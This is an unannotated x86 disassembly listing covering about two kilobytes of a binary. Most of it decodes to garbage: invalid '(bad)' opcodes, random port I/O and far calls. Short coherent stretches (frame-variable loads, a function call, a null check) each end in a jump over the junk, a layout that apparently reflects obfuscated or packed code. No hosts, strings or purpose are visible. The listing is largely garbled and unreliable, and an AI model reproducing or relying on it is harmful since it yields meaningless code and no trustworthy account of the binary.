  4020fe:	daa    
  4020ff:	leave  
  402100:	(bad)  
  402101:	(bad)  
  402102:	in     eax,0xd4
  402104:	adc    dl,BYTE PTR [edx+0x317a02c3]
  40210a:	cmp    BYTE PTR [edi+0x44],bl
  40210d:	push   0x7e
  40210f:	sub    al,0x8d
  402111:	xor    ebp,ecx
  402113:	inc    DWORD PTR ds:0xb784dc73
  402119:	adc    al,0xcd
  40211b:	xchg   ebp,eax
  40211c:	jae    0x4020c8
  40211e:	aas    
  40211f:	js     0x4020e5
  402121:	mov    al,0xd7
  402123:	in     eax,dx
  402124:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402125:	popa   
  402126:	shr    DWORD PTR [ebp+ebx*2-0x75],0xf9
  40212b:	dec    esi
  40212c:	in     al,0x10
  40212e:	mov    eax,ds:0x1f741772
  402133:	(bad)  
  402134:	or     esp,DWORD PTR [eax-0x34]
  402137:	adc    eax,0x215a78c7
  40213c:	test   BYTE PTR [ecx-0x66],ch
  40213f:	inc    eax
  402140:	idiv   al
  402142:	mov    DWORD PTR [eax-0x2b],ecx
  402145:	and    bh,BYTE PTR [ecx+0x195ba6cb]
  40214b:	ret    0x3b1e
  40214e:	mov    cl,0x50
  402150:	mov    eax,DWORD PTR [ebp-0x18]
  402153:	add    eax,0xaa
  402158:	jmp    0x4022f9
  40215d:	cmc    
  40215e:	dec    ebx
  40215f:	and    eax,0x7570a1be
  402164:	jno    0x402191
  402166:	push   ds
  402167:	mov    ch,0x76
  402169:	jge    0x4021dd
  40216b:	mov    ds:0x7e021e9f,eax
  402170:	jle    0x40216c
  402172:	jg     0x4021f2
  402174:	jle    0x402199
  402176:	das    
  402177:	loope  0x4021b8
  402179:	jle    0x402148
  40217b:	(bad)  
  40217c:	pop    ebx
  40217d:	mov    edi,0xe1bea786
  402182:	jno    0x402125
  402184:	in     eax,dx
  402185:	popa   
  402186:	or     esi,DWORD PTR [ebx]
  402188:	dec    ebx
  402189:	mov    edi,0x84293a20
  40218e:	fdivr  st(4),st
  402190:	jecxz  0x4021af
  402192:	lea    ebp,[esi+0x6c495c3c]
  402198:	cmp    BYTE PTR [edx-0x27e47c2a],bh
  40219e:	fs xor esp,ebx
  4021a1:	test   BYTE PTR [edi-0x313f6205],0x64
  4021a8:	popf   
  4021a9:	aad    0x8c
  4021ab:	stc    
  4021ac:	imul   ebx,edx,0xffffff91
  4021af:	test   eax,0x30f76bff
  4021b4:	push   esp
  4021b5:	adc    ah,BYTE PTR [ecx+0x28]
  4021b8:	jno    0x402144
  4021ba:	bound  ecx,QWORD PTR [eax]
  4021bc:	dec    ebx
  4021bd:	jae    0x402190
  4021bf:	mul    BYTE PTR [ebp-0x41]
  4021c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4021c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4021c4:	sbb    edx,DWORD PTR [ebx+0x49]
  4021c7:	adc    al,0x77
  4021c9:	dec    edi
  4021ca:	retf   0x9c39
  4021cd:	data16 loop 0x40220d
  4021d0:	jmp    0x4021ce
  4021d2:	es mov ch,0xb
  4021d5:	jnp    0x402215
  4021d7:	adc    DWORD PTR [ecx],0x7c71fe08
  4021dd:	and    esi,ebx
  4021df:	add    DWORD PTR [ebp-0x4f],ebp
  4021e2:	push   esi
  4021e3:	fwait
  4021e4:	stos   BYTE PTR es:[edi],al
  4021e5:	rol    DWORD PTR [ebx+0x38],cl
  4021e8:	mov    ebx,edi
  4021ea:	and    esi,DWORD PTR [edi]
  4021ec:	fsub   DWORD PTR [ebx+0xf]
  4021ef:	xchg   esi,eax
  4021f0:	lock nop
  4021f2:	xchg   ebx,eax
  4021f3:	outs   dx,DWORD PTR ds:[esi]
  4021f4:	fmul   DWORD PTR [eax+0x6d7e25a7]
  4021fa:	sahf   
  4021fb:	push   cs
  4021fc:	push   ebp
  4021fd:	pop    ebx
  4021fe:	xor    ch,dh
  402200:	push   cs
  402201:	jo     0x4021b5
  402203:	ds in  al,dx
  402205:	add    dh,BYTE PTR [edi+0x37]
  402208:	push   0xb
  40220a:	mov    esi,0x15cb5ecd
  40220f:	xchg   ah,dl
  402211:	xor    DWORD PTR [edi],0xffffffa3
  402214:	mov    dh,0x7
  402216:	mov    WORD PTR [edi-0x6abe2810],cs
  40221c:	jnp    0x402268
  40221e:	and    esp,DWORD PTR [edi]
  402220:	pop    ecx
  402221:	sub    esi,eax
  402223:	jmp    DWORD PTR [ebp+ecx*2-0x6a]
  402227:	loop   0x40223c
  402229:	cmp    bh,bl
  40222b:	inc    esp
  40222c:	leave  
  40222d:	mov    ah,0x59
  40222f:	jb     0x402243
  402231:	loop   0x4021db
  402233:	in     al,0x76
  402235:	jg     0x402260
  402237:	push   ds
  402238:	retf   0x55f1
  40223b:	mov    eax,0x6cd00136
  402240:	shr    DWORD PTR [edi-0x249ae336],cl
  402246:	jne    0x4021d6
  402248:	fdiv   DWORD PTR [ecx-0x99a51dc]
  40224e:	inc    edx
  40224f:	pop    edi
  402250:	pop    ebx
  402251:	mov    ah,0x81
  402253:	(bad)  
  402254:	sbb    ah,BYTE PTR ds:0x85df6434
  40225a:	(bad)  
  40225b:	jae    0x40226e
  40225d:	push   0x10158bbd
  402262:	inc    ebp
  402263:	jne    0x40224d
  402265:	adc    eax,0xa1234bc4
  40226a:	ds std 
  40226c:	inc    ebx
  40226d:	jae    0x40220a
  40226f:	xchg   ecx,eax
  402270:	clc    
  402271:	mov    al,0x3f
  402273:	xor    DWORD PTR [eax],edx
  402275:	mov    BYTE PTR [esi+0x27c762f],dl
  40227b:	loopne 0x4022d0
  40227d:	fmul   DWORD PTR [edx]
  40227f:	or     al,0x57
  402281:	scas   eax,DWORD PTR es:[edi]
  402282:	cli    
  402283:	pop    eax
  402284:	adc    eax,0x34694f32
  402289:	jne    0x4022cf
  40228b:	fdiv   QWORD PTR [ebp+0x4d]
  40228e:	adc    ecx,DWORD PTR [edx]
  402290:	pop    edi
  402291:	xchg   BYTE PTR [ebx],ah
  402293:	inc    edx
  402294:	xor    edi,DWORD PTR [edi-0x1b]
  402297:	gs loopne 0x402270
  40229a:	add    al,0xab
  40229c:	inc    ebx
  40229d:	cmp    al,0xe4
  40229f:	in     al,0x71
  4022a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4022a2:	leave  
  4022a3:	adc    DWORD PTR [eax-0x489ef5dc],edx
  4022a9:	mov    cl,0x8e
  4022ab:	lods   eax,DWORD PTR ds:[esi]
  4022ac:	mov    edi,0x46c970ea
  4022b1:	xchg   DWORD PTR [esi+0x71],esi
  4022b4:	mov    ebx,0x165c69a3
  4022b9:	add    ah,dl
  4022bb:	int3   
  4022bc:	pop    ebx
  4022bd:	xchg   esp,eax
  4022be:	out    0xb2,eax
  4022c0:	pop    esp
  4022c1:	or     DWORD PTR [ecx-0x76],edi
  4022c4:	stc    
  4022c5:	dec    esi
  4022c6:	shl    BYTE PTR [edi],0x2a
  4022c9:	cmp    DWORD PTR [ebp+0x5ae2de04],edi
  4022cf:	repnz scas eax,DWORD PTR es:[edi]
  4022d1:	sbb    eax,DWORD PTR [esi-0x52b83d91]
  4022d7:	fxch   st(5)
  4022d9:	test   eax,0x6b037293
  4022de:	mov    ebx,DWORD PTR [ebx+0x46]
  4022e1:	cmp    edi,esp
  4022e3:	int    0x33
  4022e5:	jecxz  0x4022d0
  4022e7:	mov    ebx,eax
  4022e9:	into   
  4022ea:	xchg   BYTE PTR [esi-0x80],cl
  4022ed:	sub    eax,0x98985e8b
  4022f2:	test   DWORD PTR [esi-0xc7b66c2],edx
  4022f8:	xchg   ebx,eax
  4022f9:	push   eax
  4022fa:	mov    eax,DWORD PTR [ebp-0x18]
  4022fd:	mov    eax,DWORD PTR [eax+0x198]
  402303:	push   DWORD PTR [eax]
  402305:	call   0x40984d
  40230a:	mov    DWORD PTR [ebp-0x4],eax
  40230d:	cmp    DWORD PTR [ebp-0x4],0x0
  402311:	lea    eax,[ebp+0x4]
  402314:	mov    DWORD PTR [ebp-0x38],eax
  402317:	je     0x40313f
  40231d:	lea    eax,[ebp-0xc]
  402320:	mov    DWORD PTR [ebp-0x30],eax
  402323:	mov    eax,DWORD PTR [ebp-0x4c]
  402326:	xor    eax,esi
  402328:	add    eax,edi
  40232a:	mov    DWORD PTR [ebp-0x34],eax
  40232d:	mov    eax,DWORD PTR [ebp-0x28]
  402330:	xor    eax,esi
  402332:	add    eax,edi
  402334:	mov    DWORD PTR [ebp-0x20],eax
  402337:	mov    eax,DWORD PTR [ebp-0x4]
  40233a:	mov    DWORD PTR [ebp-0x24],eax
  40233d:	lea    eax,[ebp-0x98]
  402343:	mov    DWORD PTR [ebp-0x8],eax
  402346:	jmp    0x4024e7
  40234b:	mov    ds:0x623e7a3a,al
  402350:	bound  esp,QWORD PTR ds:[edx-0x4a]
  402354:	fadd   DWORD PTR [ebp+0x4b]
  402357:	into   
  402358:	inc    ecx
  402359:	pop    edi
  40235a:	push   0xffffff9a
  40235c:	add    edi,DWORD PTR [esi+0x7e]
  40235f:	cli    
  402360:	jg     0x4023e0
  402362:	jle    0x402387
  402364:	pop    es
  402365:	or     eax,0x5d4c5ada
  40236a:	push   edx
  40236b:	push   ebx
  40236c:	or     esp,ebx
  40236e:	fmul   QWORD PTR [edx+eiz*1-0x55f025f2]
  402375:	mul    BYTE PTR [ebp+0x76]
  402378:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402379:	les    edx,FWORD PTR [eax]
  40237b:	dec    eax
  40237c:	cmp    al,0xb9
  40237e:	xchg   edx,eax
  40237f:	and    ch,BYTE PTR [edi]
  402381:	inc    esi
  402382:	mov    edi,0xcc301c0a
  402387:	sbb    BYTE PTR [edx-0x44454d57],bl
  40238d:	mov    cl,0xcb
  40238f:	in     al,dx
  402390:	scas   al,BYTE PTR es:[edi]
  402391:	cwde   
  402392:	sbb    esp,DWORD PTR [edx+0x33291017]
  402398:	leave  
  402399:	pusha  
  40239a:	ss ds aas 
  40239d:	jmp    0x402380
  40239f:	mov    ds:0x45dc163c,al
  4023a4:	sahf   
  4023a5:	inc    edx
  4023a6:	sub    al,BYTE PTR [edx+0x50]
  4023a9:	inc    esp
  4023aa:	mov    dh,0x9
  4023ac:	mov    edi,0x35486302
  4023b1:	je     0x40235f
  4023b3:	and    DWORD PTR [ecx-0x1e6567b6],edx
  4023b9:	cmp    al,0xab
  4023bb:	inc    eax
  4023bc:	dec    eax
  4023bd:	and    al,0x5c
  4023bf:	or     eax,0x15d88e8a
  4023c4:	or     esp,DWORD PTR [esi]
  4023c6:	mov    DWORD PTR [edx+0x3e],edx
  4023c9:	cmc    
  4023ca:	test   eax,0x8cbd75b5
  4023cf:	pusha  
  4023d0:	push   ebp
  4023d1:	mov    ch,0x93
  4023d3:	push   cs
  4023d4:	lods   eax,DWORD PTR ds:[esi]
  4023d5:	jg     0x40237f
  4023d7:	lea    esp,[ecx+0x3f]
  4023da:	jecxz  0x402365
  4023dc:	fld    TBYTE PTR [eax]
  4023de:	addr16 mov ecx,eax
  4023e1:	(bad)  
  4023e2:	xor    BYTE PTR [ecx+0x1de94e13],bh
  4023e8:	cmp    ecx,DWORD PTR [ebx-0x6]
  4023eb:	dec    ebx
  4023ec:	test   BYTE PTR [ebx+0x78],0x2b
  4023f0:	cmp    ah,bl
  4023f2:	dec    eax
  4023f3:	retf   0x99d2
  4023f6:	or     bl,BYTE PTR [edx+0x54a40be2]
  4023fc:	jns    0x402477
  4023fe:	int3   
  4023ff:	push   0xffffffbd
  402401:	outs   dx,DWORD PTR ds:[esi]
  402402:	jp     0x402460
  402404:	or     al,0xbb
  402406:	mov    al,0x8d
  402408:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402409:	nop    DWORD PTR [edx+0x22724f25]
  402410:	icebp  
  402411:	mov    edx,0x39785c03
  402416:	cwde   
  402417:	jae    0x4023f0
  402419:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40241a:	inc    ecx
  40241b:	sbb    eax,0x81546006
  402420:	daa    
  402421:	adc    DWORD PTR es:[ecx],edi
  402424:	std    
  402425:	inc    ebx
  402426:	test   DWORD PTR [ebx+0x47bcb8a6],0xb14f8b54
  402430:	cmc    
  402431:	and    BYTE PTR [esi+0x66],bl
  402434:	fisubr DWORD PTR [edx+0x23b5f238]
  40243a:	adc    al,0x9b
  40243c:	imul   ebx,DWORD PTR [edx],0x1
  40243f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402440:	pop    ebx
  402441:	sbb    DWORD PTR [esi+0x3f52205d],0x33
  402448:	mov    esp,0xfa02af4a
  40244d:	test   eax,0x82a66625
  402452:	ins    BYTE PTR es:[edi],dx
  402453:	fadd   DWORD PTR [ebx]
  402455:	test   DWORD PTR [ecx],esi
  402457:	mov    ah,0x98
  402459:	add    DWORD PTR [ecx-0x73b80082],eax
  40245f:	jecxz  0x402411
  402461:	fidiv  DWORD PTR [ecx]
  402463:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402464:	mov    cl,BYTE PTR [edx+eiz*4+0x38]
  402468:	sub    esp,DWORD PTR [ecx]
  40246a:	and    eax,0x308cfd60
  40246f:	test   BYTE PTR [edx],dl
  402471:	push   edi
  402472:	mov    esp,0x1f62ca79
  402477:	push   ss
  402478:	jl     0x402429
  40247a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40247b:	dec    DWORD PTR [eax+0x1882ef53]
  402481:	shl    eax,0x33
  402484:	xchg   esi,eax
  402485:	inc    ebx
  402486:	pop    ebx
  402487:	add    BYTE PTR [ecx],ah
  402489:	adc    edi,ebp
  40248b:	cld    
  40248c:	fdivr  st,st(5)
  40248e:	jge    0x402418
  402490:	fs in  eax,0xf
  402493:	nop
  402494:	inc    ebp
  402495:	mov    bh,0x3
  402497:	push   ss
  402498:	sbb    BYTE PTR [ecx+eax*8-0x7060c742],ch
  40249f:	out    dx,al
  4024a0:	add    ecx,esi
  4024a2:	test   cl,dh
  4024a4:	pop    ebp
  4024a5:	and    edi,DWORD PTR [ebx]
  4024a7:	push   0xffffffc5
  4024a9:	inc    edx
  4024aa:	fsubp  st(7),st
  4024ac:	in     eax,0x30
  4024ae:	push   edi
  4024af:	arpl   WORD PTR [ebp+0x47],cx
  4024b2:	scas   al,BYTE PTR es:[edi]
  4024b3:	add    DWORD PTR [esi],0x7ebb4605
  4024b9:	call   0x1339:0xdc48c809
  4024c0:	bound  esi,QWORD PTR [ebp+0x26]
  4024c3:	jo     0x40252d
  4024c5:	retf   0x8bb2
  4024c8:	mov    bl,0x6d
  4024ca:	xor    DWORD PTR ss:[ebx+ecx*4-0x7ac21be2],ebp
  4024d2:	loop   0x402462
  4024d4:	int3   
  4024d5:	adc    eax,0xf1453a57
  4024da:	ins    DWORD PTR es:[edi],dx
  4024db:	push   esi
  4024dc:	loop   0x402519
  4024de:	in     al,dx
  4024df:	xor    bh,bl
  4024e1:	icebp  
  4024e2:	mov    eax,ds:0x4ce76cb5
  4024e7:	mov    eax,DWORD PTR [ebp-0x10]
  4024ea:	mov    DWORD PTR [ebp-0x10],eax
  4024ed:	mov    eax,DWORD PTR [ebp-0x1c]
  4024f0:	mov    DWORD PTR [ebp-0x40],ebx
  4024f3:	mov    DWORD PTR [ebp-0x2c],eax
  4024f6:	mov    eax,DWORD PTR [ebp-0x40]
  4024f9:	mov    ecx,DWORD PTR [ebp-0x8]
  4024fc:	jmp    0x40269d
  402501:	push   ebp
  402502:	shl    BYTE PTR [ebp+0x7159b138],1
  402508:	push   ecx
  402509:	stos   DWORD PTR es:[edi],eax
  40250a:	rol    eax,0x47
  40250d:	xchg   ebp,eax
  40250e:	enter  0xfef0,0x26
  402512:	add    DWORD PTR [esi+0x7e],edi
  402515:	cli    
  402516:	jg     0x402596
  402518:	jle    0x4024e8
  40251a:	cmp    DWORD PTR [ebx+ecx*1-0x59],ecx
  40251e:	add    bl,BYTE PTR ss:[eax+0x51]
  402522:	jecxz  0x4024f5
  402524:	dec    esp
  402525:	sub    DWORD PTR [edi+eiz*1],ecx
  402528:	mov    dl,0x53
  40252a:	pop    ebp
  40252b:	sub    esi,DWORD PTR [ebx]
  40252d:	in     eax,0xa4
  40252f:	into   
  402530:	mov    ds:0x81e43941,al
  402535:	fwait
  402536:	cmp    al,0x8c
  402538:	or     BYTE PTR [esi-0x1ac27a93],dl
  40253e:	mov    edi,0x7833c73
  402543:	sub    BYTE PTR [ebp-0xa],al
  402546:	jbe    0x40251a
  402548:	mov    al,ds:0xc5e37dd4
  40254d:	jmp    0x6e747c48
  402552:	xor    dx,si
  402555:	dec    edx
  402556:	lock loopne 0x40254c
  402559:	cmp    cl,cl
  40255b:	data16 or dl,BYTE PTR [esi+0x2502bac6]
  402562:	xchg   edx,eax
  402563:	imul   ecx,DWORD PTR [edx+0x2f],0xffffffdb
  402567:	iret   
  402568:	lods   eax,DWORD PTR ds:[esi]
  402569:	(bad)  
  40256a:	cmp    BYTE PTR ds:0xa077cac9,dl
  402570:	adc    DWORD PTR [edi],0x120c453d
  402576:	ja     0x4024f8
  402578:	xor    edi,eax
  40257a:	inc    edx
  40257b:	jns    0x402523
  40257d:	sub    DWORD PTR [ebp+0x35],0x5e
  402581:	jne    0x402549
  402583:	mov    esp,0xa94bd7c
  402588:	mov    DWORD PTR [ebp+0x33],ebx
  40258b:	and    dl,BYTE PTR [ebp+0x22]
  40258e:	in     eax,0xa2
  402590:	int3   
  402591:	aaa    
  402592:	mov    bh,0x1d
  402594:	mov    al,ds:0xf122de28
  402599:	pop    es
  40259a:	jp     0x4025b6
  40259c:	int    0x4b
  40259e:	(bad)  
  40259f:	mov    fs,WORD PTR [edi-0xf0d2e05]
  4025a5:	dec    esp
  4025a6:	loopne 0x402612
  4025a8:	cmp    dh,BYTE PTR [eax]
  4025aa:	xor    ebp,DWORD PTR [ebp+0x25581ad5]
  4025b0:	mov    edx,0x28727856
  4025b5:	add    BYTE PTR [ecx-0x4e],cl
  4025b8:	pop    es
  4025b9:	xchg   esi,eax
  4025ba:	mov    WORD PTR [edx+0xe],?
  4025bd:	icebp  
  4025be:	mov    eax,0x628832d7
  4025c3:	pusha  
  4025c4:	pop    ds
  4025c5:	sbb    eax,0xb8931cca
  4025ca:	xor    cl,cl
  4025cc:	mov    ss,WORD PTR [edi-0x1d91ba50]
  4025d2:	mov    WORD PTR [ebp-0x51],gs
  4025d5:	add    bh,bl
  4025d7:	sbb    ebx,esp
  4025d9:	inc    ecx
  4025da:	push   ebp
  4025db:	sub    al,0x53
  4025dd:	mov    dl,0x2c
  4025df:	pop    ebx
  4025e0:	mov    DWORD PTR [ecx*1-0x54b59bf2],edi
  4025e7:	and    DWORD PTR [ebx+0x4c06df45],ebx
  4025ed:	sti    
  4025ee:	fucomp st(7)
  4025f0:	js     0x402578
  4025f2:	or     ecx,edx
  4025f4:	outs   dx,DWORD PTR ds:[esi]
  4025f5:	test   BYTE PTR [eax],dl
  4025f7:	push   edi
  4025f8:	rcr    DWORD PTR [edx+0x5353ebf3],cl
  4025fe:	scas   al,BYTE PTR es:[edi]
  4025ff:	sbb    ebx,edi
  402601:	aad    0x13
  402603:	jne    0x4025e1
  402605:	loop   0x40264a
  402607:	scas   eax,DWORD PTR es:[edi]
  402608:	imul   esi,DWORD PTR [ebx],0x38
  40260b:	jno    0x4025a6
  40260d:	pop    ecx
  40260e:	dec    ebx
  40260f:	mov    ebx,ecx
  402611:	das    
  402612:	or     eax,esp
  402614:	push   ecx
  402615:	std    
  402616:	fiadd  WORD PTR ds:0x387af032
  40261c:	in     eax,dx
  40261d:	cmp    al,0x9a
  40261f:	fst    QWORD PTR [esi+0x7c]
  402622:	push   edi
  402623:	cmp    BYTE PTR [ecx],bh
  402625:	sti    
  402626:	push   es
  402627:	shl    BYTE PTR [edx+0x54],0xd2
  40262b:	stos   DWORD PTR es:[edi],eax
  40262c:	fld    QWORD PTR [edi]
  40262e:	jmp    0xad82b75a
  402633:	and    eax,0xc326a80a
  402638:	(bad)  
  402639:	loopne 0x4025c5
  40263b:	xchg   edi,esp
  40263d:	xchg   DWORD PTR [edx-0x53],ecx
  402640:	pop    ebx
  402641:	jo     0x402698
  402643:	or     eax,0x9c0c2fc9
  402648:	adc    al,0x7e
  40264a:	or     al,0xc7
  40264c:	jp     0x402660
  40264e:	mov    cl,0x65
  402650:	test   BYTE PTR [eax-0xe],cl
  402653:	push   edx
  402654:	fwait
  402655:	test   DWORD PTR [ecx],esp
  402657:	xchg   ecx,eax
  402658:	fisttp QWORD PTR [ecx+eiz*8-0x45]
  40265c:	mov    eax,ds:0x57a9b9f5
  402661:	jge    0x4026bc
  402663:	add    ch,0xc1
  402666:	cld    
  402667:	cmovp  esi,eax
  40266a:	xor    al,0xc6
  40266c:	xlat   BYTE PTR ds:[ebx]
  40266d:	and    al,0x9b
  40266f:	sbb    bh,BYTE PTR [edx]
  402671:	into   
  402672:	or     eax,ebx
  402674:	mov    bl,0x14
  402676:	xchg   esi,eax
  402677:	add    DWORD PTR es:[ecx-0x2f0a74c5],esi
  40267e:	(bad)  
  40267f:	pop    edi
  402680:	mov    dl,0xa4
  402682:	fwait
  402683:	xchg   BYTE PTR [edi+0x15],dh
  402686:	add    eax,DWORD PTR ds:0xe8e99dc8
  40268c:	xchg   ebp,eax
  40268d:	scas   eax,DWORD PTR es:[edi]
  40268e:	lods   eax,DWORD PTR ds:[esi]
  40268f:	mov    ds:0x7f6034a3,al
  402694:	push   eax
  402695:	pop    edx
  402696:	sbb    eax,0xc7951c91
  40269b:	lea    si,[ebx]
  40269e:	mov    BYTE PTR ds:0x32729b,0x89
  4026a5:	add    DWORD PTR [ebx+0x4d8bdc45],ecx
  4026ab:	clc    
  4026ac:	mov    DWORD PTR [ecx+0x4],eax
  4026af:	mov    eax,DWORD PTR [ebp-0x20]
  4026b2:	mov    ecx,DWORD PTR [ebp-0x8]
  4026b5:	mov    DWORD PTR [ecx+0x8],eax
  4026b8:	mov    eax,DWORD PTR [ebp-0x34]
  4026bb:	mov    ecx,DWORD PTR [ebp-0x8]
  4026be:	mov    DWORD PTR [ecx+0xc],eax
  4026c1:	jmp    0x402862
  4026c6:	les    ecx,FWORD PTR [eax+0x5552d502]
  4026cc:	ror    DWORD PTR [ecx-0x7d59e5d1],1
  4026d2:	pop    esp
  4026d3:	lea    esi,[eax]
  4026d5:	shl    DWORD PTR [edx-0x58181f2],0x7f
  4026dc:	jle    0x40275c
  4026de:	(bad)  
  4026df:	std    
  4026e0:	adc    BYTE PTR [bx+di-0x5d],bh
  4026e4:	jno    0x4026a9
  4026e6:	pop    esp
  4026e7:	push   ebx
  4026e8:	outs   dx,DWORD PTR ds:[esi]
  4026e9:	shl    DWORD PTR [ecx-0x7f886658],0xac
  4026f0:	cs int 0x20
  4026f3:	inc    eax
  4026f4:	push   0xffffffaf
  4026f6:	mov    edx,0xc18764d3
  4026fb:	cmp    BYTE PTR [edi-0x24],bl
  4026fe:	jo     0x40270c
  402700:	loope  0x402721
  402702:	jno    0x40273f
  402704:	sub    al,0x3a
  402706:	pop    edx
  402707:	cld    
  402708:	push   0xc5465c14
  40270d:	or     al,0x0
  40270f:	xor    BYTE PTR [esi-0x42],bh
  402712:	and    ebx,DWORD PTR [eax]
  402714:	daa    
  402715:	cmp    BYTE PTR [edi+0x168035f4],cl
  40271b:	and    bh,BYTE PTR ds:0x8709539f
  402721:	xor    DWORD PTR [eax],eax
  402723:	dec    esi
  402724:	mov    ebx,0xc8ad0e54
  402729:	cmp    DWORD PTR [edx+0x69],ebp
  40272c:	or     al,0xdf
  40272e:	mov    dh,0x1
  402730:	or     eax,0xd8148aa8
  402735:	mov    cl,0x1
  402737:	dec    ebx
  402738:	(bad)
  40273b:	cmp    al,0xb3
  40273d:	and    al,0xd2
  40273f:	sbb    eax,0x379b556a
  402744:	retf   0x1da6
  402747:	inc    eax
  402748:	or     ah,BYTE PTR [esi+0x48955cbb]
  40274e:	sbb    al,0x8a
  402750:	push   ebx
  402751:	mov    bh,0x1b
  402753:	adc    DWORD PTR [eax+ebp*8+0x58],ecx
  402757:	pop    edx
  402758:	push   edx
  402759:	popa   
  40275a:	or     eax,DWORD PTR [ebx]
  40275c:	sbb    al,0x12
  40275e:	test   DWORD PTR [eax],esp
  402760:	lock jecxz 0x4027c2
  402763:	sub    DWORD PTR [ecx+0x65c5152a],ebx
  402769:	mov    ecx,DWORD PTR [edi-0x23]
  40276c:	sbb    ebp,esp
  40276e:	or     eax,0x114bb8e9
  402773:	dec    ecx
  402774:	sub    ch,cl
  402776:	call   0xec15:0xc1f599e0
  40277d:	jmp    0x402740
  40277f:	loope  0x4027c1
  402781:	fisttp DWORD PTR [ecx+0x3c]
  402784:	data16 jle 0x4027bb
  402787:	mov    eax,ds:0x29ac975c
  40278c:	jb     0x4027d2
  40278e:	lds    esp,FWORD PTR [ecx-0xd4e654d]
  402794:	cld    
  402795:	stc    
  402796:	fcmovnb st,st(2)
  402798:	loopne 0x40277d
  40279a:	icebp  
  40279b:	loope  0x402805
  40279d:	std    
  40279e:	aad    0x26
  4027a0:	mov    ch,0xfe
  4027a2:	xchg   esp,eax
  4027a3:	not    DWORD PTR [edi]
  4027a5:	jp     0x402741
  4027a7:	dec    ebp
  4027a8:	mov    ds:0xa65e554c,eax
  4027ad:	sahf   
  4027ae:	mov    esp,0x3ccc6c4d
  4027b3:	iret   
  4027b4:	dec    edi
  4027b5:	and    al,0xee
  4027b7:	cs daa 
  4027b9:	pop    edi
  4027ba:	cdq    
  4027bb:	pop    ss
  4027bc:	mov    bh,0x4e
  4027be:	push   ds
  4027bf:	shr    DWORD PTR ds:0xbb850b78,0x65
  4027c6:	jmp    0xca7fee05
  4027cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4027cc:	stc    
  4027cd:	adc    BYTE PTR [edx-0x19],ch
  4027d0:	stos   BYTE PTR es:[edi],al
  4027d1:	sbb    ah,BYTE PTR [ecx-0x2e]
  4027d4:	dec    ecx
  4027d5:	or     ecx,esi
  4027d7:	mov    fs,eax
  4027d9:	mov    ebx,ebp
  4027db:	mov    ds:0x349c813e,eax
  4027e0:	mov    dl,0x8b
  4027e2:	out    0x94,eax
  4027e4:	shl    dl,0xe
  4027e7:	pop    esi
  4027e8:	fiadd  DWORD PTR [esi]
  4027ea:	lea    eax,[ebx]
  4027ec:	stos   BYTE PTR es:[edi],al
  4027ed:	pushf  
  4027ee:	clc    
  4027ef:	pop    es
  4027f0:	stc    
  4027f1:	push   eax
  4027f2:	ds dec esi
  4027f4:	sub    BYTE PTR [edi],bl
  4027f6:	add    al,0x31
  4027f8:	in     al,dx
  4027f9:	adc    al,0x5b
  4027fb:	das    
  4027fc:	cwde   
  4027fd:	inc    ecx
  4027fe:	xchg   esp,eax
  4027ff:	cmp    BYTE PTR [eax],ah
  402801:	xchg   esi,eax
  402802:	loop   0x4027d0
  402804:	(bad)  
  402805:	mov    ds:0xa9a6127c,eax
  40280a:	imul   esp,DWORD PTR [ecx+0x77bc2df8],0xffffffd2
  402811:	jl     0x40283f
  402813:	stc    
  402814:	out    0x9f,eax
  402816:	fiadd  DWORD PTR [edi-0x52f6de60]
  40281c:	ror    edi,0xec
  40281f:	xor    ebp,edx
  402821:	add    ecx,esp
  402823:	xchg   edi,eax
  402824:	fs mov dl,0x1c
  402827:	cmp    dl,BYTE PTR [edi+0xf]
  40282a:	add    al,0x15
  40282c:	mov    dl,0x9c
  40282e:	das    
  40282f:	dec    ebx
  402830:	cmp    al,0x7b
  402832:	ds mov edi,0xa1be870f
  402838:	aaa    
  402839:	sub    BYTE PTR [edx],dh
  40283b:	sub    esi,DWORD PTR [edx]
  40283d:	repz sti 
  40283f:	add    al,0x5d
  402842:	sub    eax,0xbd8f0f4
  402847:	add    BYTE PTR [ebx-0x33e75969],bl
  40284d:	lahf   
  40284e:	test   eax,0xc916e0e3
  402853:	jnp    0x4027f8
  402855:	fldenv [ebp-0x433a972e]
  40285b:	pop    es
  40285c:	push   esi
  40285d:	and    BYTE PTR [edx-0x74b19ca7],bh
  402863:	inc    ebp
  402864:	ror    BYTE PTR [ebx+0x4189f84d],1
  40286a:	adc    BYTE PTR [ebx-0x23ba7440],cl
  402870:	test   eax,eax
  402872:	jmp    0x402a13
  402877:	inc    edi
  402878:	push   eax
  402879:	jnp    0x402883
  40287b:	or     DWORD PTR [ecx+0x55],edx
  40287e:	push   ecx
  40287f:	adc    BYTE PTR [ebx],ch
  402881:	nop
  402882:	dec    esp
  402883:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402884:	sub    dh,BYTE PTR [esp+ebp*4+0x2e]
  402888:	or     al,0x7e
  40288a:	jle    0x402886
  40288c:	jg     0x40290c
  40288e:	jle    0x4028fb
  402890:	cmp    DWORD PTR [edi+0x2dafc7b5],0x12
  402897:	loopne 0x40287b
  402899:	xor    DWORD PTR [ecx-0x46e5c36f],ecx
  40289f:	xor    esp,DWORD PTR [ebx+0xb2f53f8]
  4028a5:	inc    ecx
  4028a6:	mov    ecx,0x2771cdcc
  4028ab:	sti    
  4028ac:	and    edx,DWORD PTR [eax-0xee27555]
  4028b2:	pop    ebx
  4028b3:	or     al,0x6c
  4028b5:	jae    0x402851
  4028b7:	and    al,bh
  4028b9:	outs   dx,BYTE PTR ds:[esi]
  4028ba:	mov    bh,0x4e
  4028bc:	pop    edx
  4028bd:	adc    ch,BYTE PTR [edx+0x6d]
  4028c0:	icebp  
  4028c1:	dec    ebx
  4028c2:	(bad)  
  4028c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4028c4:	push   ebx
